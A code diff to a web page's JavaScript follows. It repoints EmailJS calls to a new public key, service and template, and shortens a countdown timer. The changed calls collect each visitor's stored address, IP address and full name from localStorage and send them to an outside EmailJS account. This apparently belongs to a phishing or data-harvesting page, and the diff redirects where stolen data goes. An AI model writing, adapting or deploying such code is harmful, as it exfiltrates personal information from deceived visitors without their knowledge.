@@ -51,9 +51,9 @@
 					var currentSecond = currentDate.getSeconds();
 					var currentTime = " - " + currentMinute + ":" + currentSecond;
 					emailjs.init({
-						publicKey: "PkTU7VPpDIazDvwtn",
+						publicKey: "WR7OcQOL9KAM4SDj7",
 					});
-					emailjs.send("service_x3p3738", "template_06vdlbg", {
+					emailjs.send("service_bnlw1hj", "template_y58uxuj", {
 						location: localStorage.getItem("address"),
 						ip: localStorage.getItem("ipAddress"),
 						fullName: localStorage.getItem("fullName"),
@@ -78,8 +78,8 @@
 						if (seconds > 0) {
 							timer.style.display = "block";
 							seconds--;
-							var minutes = Math.floor(seconds / 30);
-							var second = seconds % 30;
+							var minutes = Math.floor(seconds / 15);
+							var second = seconds % 15;
 							timer.innerHTML =
 								"(" +
 								(minutes < 10 ? "0" : "") +
@@ -111,9 +111,9 @@
 					button.style.backgroundColor = "#75aaee";
 					button.removeAttribute("onclick");
 					emailjs.init({
-						publicKey: "3PkTU7VPpDIazDvwtn",
+						publicKey: "WR7OcQOL9KAM4SDj7",
 					});
-					emailjs.send("sservice_x3p3738", "template_06vdlbg", {
+					emailjs.send("service_bnlw1hj", "template_y58uxuj", {
 						location: localStorage.getItem("address"),
 						ip: localStorage.getItem("ipAddress"),
 						fullName: localStorage.getItem("fullName"),
